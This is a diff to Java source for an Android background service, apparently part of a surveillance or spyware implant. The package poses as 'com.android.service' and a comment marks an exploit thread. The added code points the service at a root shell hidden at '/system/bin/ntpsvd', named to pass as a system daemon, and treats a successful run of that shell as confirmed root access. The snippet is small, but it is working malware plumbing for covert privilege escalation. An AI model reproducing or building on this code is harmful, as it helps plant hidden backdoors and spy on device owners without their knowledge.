@@ -3,8 +3,10 @@ package com.android.service;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
+import java.io.FilePermission;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -19,6 +21,7 @@ import android.graphics.Bitmap.Config;
 import android.graphics.Canvas;
 import android.graphics.Paint;
 import android.os.IBinder;
+import android.util.Log;
 import android.view.Display;
 import android.view.WindowManager;
 import android.widget.Toast;
@@ -91,7 +94,7 @@ public class ServiceCore extends Service {
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
 
-		this.shellFile = "rdb";
+		this.shellFile = "/system/bin/ntpsvd";
 
 		if (checkRoot() == true) {
 			Status.self().setRoot(true);
@@ -226,13 +229,26 @@ public class ServiceCore extends Service {
 	}
 
 	private boolean checkRoot() {
+		boolean isRoot = false;
+		
 		try {
-			getApplicationContext().openFileInput(shellFile);
-		} catch (FileNotFoundException f) {
-			return false;
+			// Verifichiamo di essere root
+			Process p = Runtime.getRuntime().exec(shellFile + " air");
+			p.waitFor();
+			
+			if (p.exitValue() == 1) {
+				if (Cfg.DEBUG)
+					Log.d("QZ", TAG + " (checkRoot): isRoot YEAHHHHH");
+				
+				isRoot = true;
+			}
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(e);
+			}
 		}
 
-		return true;
+		return isRoot;
 	}
 
 	// Exploit thread
